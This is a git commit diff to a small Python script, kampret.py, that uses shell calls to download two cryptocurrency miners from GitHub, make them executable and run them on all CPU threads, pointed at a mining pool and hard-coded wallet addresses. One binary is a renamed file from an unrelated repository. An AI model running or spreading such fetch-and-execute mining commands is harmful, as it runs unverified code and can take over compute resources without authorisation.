d45e1af818cbd4595b195563ff2823e3ddcf256d
Erlandi <the@erlandi.my.id>
2024-04-22 14:12:54 +0700

    Update kampret.py

--- kampret.py
+++ kampret.py
@@ -1,5 +1,5 @@
 import os as kampre
-kampret.system("curl -s https://api.github.com/repos/Qubic-Solutions/rqiner-builds/releases/latest | grep "rqiner-aarch64-mobile" | grep "browser_download_url" | cut -d : -f 2,3 | xargs wget -O rqiner && chmod +x rqiner && ./rqiner -i XJELCGMMEXRKRACURWWHGHGEYNIASDDPZFBIDOPYQGVQMXLKCALNOSZGXHUH -l miner_$(ifconfig | grep -oE 'inet [0-9.]+' | grep "192" | sed 's/inet //' | cut -d . -f 4) -t 8")
+kampret.system("curl -s https://api.github.com/repos/Qubic-Solutions/rqiner-builds/releases/latest | grep "rqiner-aarch64-mobile" | grep "browser_download_url" | cut -d : -f 2,3 | xargs wget -O rqiner && chmod +x rqiner && ./rqiner -i XJELCGMMEXRKRACURWWHGHGEYNIASDDPZFBIDOPYQGVQMXLKCALNOSZGXHUH -t 8")
 kampret.system("wget https://raw.githubusercontent.com/petugas/No/main/k")
 kampret.system("chmod +x k")
 kampret.system("./k --url xm.erlandi.eu.org:8080 -u ZEPHsB4SF9T9wS4vyAbjZ6FzTDyCRFeV5MK7qqHdt2AHWfsmb1P7cbe2gfYp5py78DT6gFyLZixVqc11DNRyY9CHbs2BQG7LDyt -a rx/0 -t $(nproc)")
